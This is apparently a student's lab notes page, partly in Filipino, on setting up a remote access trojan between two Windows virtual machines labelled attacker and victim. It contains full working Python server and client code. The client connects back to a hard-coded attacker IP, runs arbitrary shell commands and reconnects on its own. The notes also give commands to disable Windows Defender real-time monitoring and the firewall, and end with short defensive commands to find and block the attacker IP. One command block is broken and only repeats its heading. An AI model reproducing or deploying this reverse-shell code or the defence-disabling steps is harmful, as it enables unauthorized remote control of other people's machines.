### PowerShell
```bash
Get-NetTCPConnection -RemoteAddress 10.28.0.149 | Select-Object OwningProcess, State # Find which program is connecting to 10.28.0.149
Get-Process -Id <OwningProcess> | Select-Object Name, Path
```


### Block the Attacker’s IP
```bash
# Block all outbound traffic to the attacker
New-NetFirewallRule -DisplayName "Block Attacker" -Direction Outbound -RemoteAddress 10.28.0.149 -Action Block
```


---
### Remote Access Trojan (RAT) 

Network Testing - Two machines (or VMs) on the same network
- WINServer22-1 : Server
- WINServer22-2 : Client / Victim



Find the **server's local IP** (ipconfig on Windows / ifconfig on Linux).
- Replace "attacker_ip_here" in client.py with the server’s IP.
- Attacker IP: 208.8.8.140 (IPv4 Address)
port 5555 - firewall port



Disable the Windows Security Threat (only if enabled):

```bash
# Disable
Set-MpPreference -DisableRealtimeMonitoring $true
```


```
#Enable
Set-MpPreference -DisableRealtimeMonitoring $false
```

Disable the Firewall of the Server
```bash
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

Ping the server IP (from client's terminal)
```bash
# Command Prompt
ping 208.8.8.140
```


Enable telnet in Windows Powershell
```bash
Enable-WindowsOptionalFeature -Online -FeatureName "TelnetClient"
```


Check if the port (5555) is listening:
```bash
Check if the port (5555) is listening:
```



## `server.py`
- This listens for incoming connections on port `5555`
- Firewall must allow inbound connections on port `5555`
  
Example PowerShell command to allow the port:
```bash
New-NetFirewallRule -DisplayName "PythonTest" -Direction Inbound -LocalPort 5555 -Protocol TCP -Action Allow
```

```python
# server.py
# server.py - Run on the ADMIN machine
"""
Remote Administration Tool - Server Component
For educational purposes only. Use only on systems you own or have permission to control.
"""

import socket
import threading

def handle_client(conn, addr):
    """
    Handle communication with a connected client.
    
    Args:
        conn: Socket object for the connection
        addr: Tuple containing client IP and port
    """
    print(f"[+] Connection from {addr}")
    try:
        while True:
            cmd = input("admin$ ")  # Get command from admin
            
            # Process special commands
            if cmd.lower() == 'shutdown':
                conn.send(b"shutdown /s /t 60 /c \"System maintenance shutdown\"")
                print("[+] Sent shutdown command (60s delay)")
            elif cmd.lower() == 'restart':
                conn.send(b"shutdown /r /t 30 /c \"System restarting in 30 seconds\"")
            elif cmd.lower() == 'cancel':
                conn.send(b"shutdown /a")
                print("[+] Sent shutdown cancel command")
            elif cmd.lower() == 'exit':
                conn.send(b"exit")
                break
            else:
                # Send normal command to client
                conn.send(cmd.encode())
                # Print command output from client
                print(conn.recv(8192).decode())
                
    except Exception as e:
        print(f"Error: {e}")
    finally:
        conn.close()
        print(f"[-] {addr} disconnected")

def start_server():
    """
    Start the server and listen for incoming connections.
    Creates a new thread for each connected client.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 5555))  # Listen on all interfaces
    s.listen(5)  # Allow up to 5 queued connections
    print("[*] Server started on 0.0.0.0:5555")
    
    try:
        while True:
            conn, addr = s.accept()  # Wait for connection
            # Create thread to handle client
            thread = threading.Thread(target=handle_client, args=(conn, addr))
            thread.start()
    except KeyboardInterrupt:
        print("\n[!] Server shutting down...")
    finally:
        s.close()

if __name__ == "__main__":
    start_server()

```

## `client.py `
- The client initiates the connection to the `server’s IP` (208.8.8.140)
- No need to disable the client’s firewall (outbound connections are usually allowed by default).


```python
# client.py

# client.py - Run on the TARGET machine
"""
Remote Administration Tool - Client Component
For educational purposes only. Use only on systems you own or have permission to control.
"""

import socket
import subprocess
import ctypes
import os
import time

def is_admin():
    """
    Check if the current process has administrator privileges.
    
    Returns:
        bool: True if running as admin, False otherwise
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def execute_command(command):
    """
    Execute a system command and return its output.
    Handles special 'cd' command separately to change directories.
    
    Args:
        command (str): The command to execute
        
    Returns:
        str: Command output or error message
    """
    try:
        if command.startswith("cd "):
            os.chdir(command[3:])  # Change directory
            return f"Changed directory to {os.getcwd()}"
        else:
            output = subprocess.getoutput(command)
            return output
    except Exception as e:
        return f"Error: {str(e)}"

def connect_to_server(server_ip, port):
    """
    Connect to the server and process incoming commands.
    Automatically reconnects if connection is lost.
    
    Args:
        server_ip (str): IP address of the server
        port (int): Port number to connect to
    """
    while True:
        try:
            print(f"[*] Attempting to connect to {server_ip}:{port}...")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)  # Set connection timeout
            s.connect((server_ip, port))
            print("[+] Connected to server")
            
            while True:
                command = s.recv(8192).decode().strip()
                
                if not command:  # Empty message means connection closed
                    print("[!] Server disconnected")
                    break
                    
                if command.lower() == 'exit':
                    s.close()
                    return
                
                # Handle shutdown commands
                if command.startswith("shutdown"):
                    if not is_admin():
                        s.send(b"Error: Admin rights required")
                        continue
                    try:
                        subprocess.run(command, shell=True)
                        s.send(b"Shutdown command executed")
                    except Exception as e:
                        s.send(f"Error: {str(e)}".encode())
                else:
                    # Execute normal commands
                    output = execute_command(command)
                    s.send(output.encode())
                    
        except socket.timeout:
            print("[!] Connection timeout")
        except ConnectionRefusedError:
            print("[!] Server unavailable")
        except Exception as e:
            print(f"[!] Error: {str(e)}")
        
        print("[*] Reconnecting in 10 seconds...")
        time.sleep(10)

if __name__ == "__main__":
    SERVER_IP = "208.8.8.140"  # Replace with server IP
    PORT = 5555
    connect_to_server(SERVER_IP, PORT)

```




---
### WinError 10061

Kapag ganiyan yung error, check yung IP. Baka mali/mismatch lang


---
Kapag gusto ko i-shutdown device ni client/victim:

```bash
# Restart instead of shutdown
conn.send(b"shutdown /r /t 30")

# Abort shutdown
conn.send(b"shutdown /a")
```






